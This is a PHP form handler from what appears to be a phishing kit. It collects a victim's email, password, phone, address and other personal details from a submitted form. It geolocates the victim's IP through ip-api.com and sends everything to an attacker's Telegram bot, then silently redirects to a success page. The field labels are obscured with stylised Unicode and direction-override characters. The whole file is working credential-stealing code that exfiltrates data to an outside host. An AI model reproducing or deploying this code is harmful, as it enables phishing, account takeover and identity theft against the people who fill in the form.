<?php
include 'bot.php';
error_reporting(0);
$dsnkewing = $_POST['email'];
$fjiemfxoa = $_POST['password'];
$pho =  $_POST['phone'];
$org =  $_POST['organization'];
$addr = $_POST['address'];
$pos  = $_POST['postal'];
$city = $_POST['city'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$tarih=date("d-m-Y H:i:s");

if($dsnkewing == "" && $fjiemfxoa == "" && $followers == "")
{
header("Location: index.php");
}else{

$text = urlencode("
🅂🄴🅃🄾🅁 🅁🄴🅂🅄🄻🅃 🄱🄾🅂
====================
ᵁ‪‮ᴹᴬᴺᴿᴱˢ‬ᴱ : $dsnkewing
ᴾ‪‮ᴿᴼᵂˢˢᴬ‬ᴰ : $fjiemfxoa
ᴾᴼᴺᴱ : $pho
ᴼᴿ : $org
ᴬᴰᴰᴿᴱˢˢ : $addr
ᴾᴼˢᵀᴬᴸ : $pos
ᶜᴵᵀʸ : $city
ᶜᴼᵁᴺᵀᴿʸ : $country
ᴵᴾ : $ip
ᴰᴬᵀᴱ : $tarih
====================
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
if($url) {
echo "<form id='schtdek' method='POST' action='success.php'>
<input type='hidden' name='dsnkewing' value=''>
</form>
<script type='text/javascript'>document.getElementById('schtdek').submit();</script>";
}
}
?>